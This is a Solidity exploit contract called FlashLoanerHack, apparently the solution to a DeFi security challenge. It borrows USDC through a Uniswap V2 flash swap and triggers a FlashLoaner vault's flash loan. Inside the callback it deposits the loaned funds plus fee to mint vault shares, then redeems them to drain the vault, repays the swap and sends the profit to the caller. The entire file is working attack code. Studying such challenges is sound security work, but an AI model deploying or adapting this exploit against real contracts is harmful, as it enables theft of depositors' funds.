pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "../flash-loaner/FlashLoaner.sol";

contract FlashLoanerHack {
    IUniswapV2Pair private immutable PAIR;
    FlashLoaner private immutable FLASH_LOAN;
    uint256 private shares;

    constructor(IUniswapV2Pair _pair, FlashLoaner _flashLoan) {
        PAIR = _pair;
        FLASH_LOAN = _flashLoan;
    }

    function run() external {
        IERC20(PAIR.token0()).approve(address(FLASH_LOAN), type(uint256).max);
        uint256 supply = FLASH_LOAN.totalAssets() - 1;
        uint256 feeBasis = FLASH_LOAN.feeBasis();
        uint256 fee = (supply * feeBasis) / 10000;
        uint256 swapAmount = supply + fee + 1;
        PAIR.swap(swapAmount, 0, address(this), abi.encode(supply, msg.sender));
    }

    function uniswapV2Call(
        address _sender,
        uint256 _amount0,
        uint256 _amount1,
        bytes calldata _data
    ) external {
        (uint256 supply, address to) = abi.decode(_data, (uint256, address));
        IERC20 usdc = IERC20(PAIR.token0());
        FLASH_LOAN.flash(address(this), supply, abi.encode(supply));
        FLASH_LOAN.redeem(shares, address(this), address(this));
        uint256 repayAmount = calculateRepay(_amount0);
        usdc.transfer(msg.sender, repayAmount);
        usdc.transfer(to, usdc.balanceOf(address(this)));
    }

    function flashCallback(uint256 fee, bytes calldata data) external {
        uint256 supply = abi.decode(data, (uint256));
        shares = FLASH_LOAN.deposit(supply + fee, address(this));
    }

    function calculateRepay(uint256 amount) private pure returns (uint256) {
        uint256 num = amount * (10**18) * 1000;
        uint256 x = num / 997 / 10**18;
        return x + 1;
    }
}
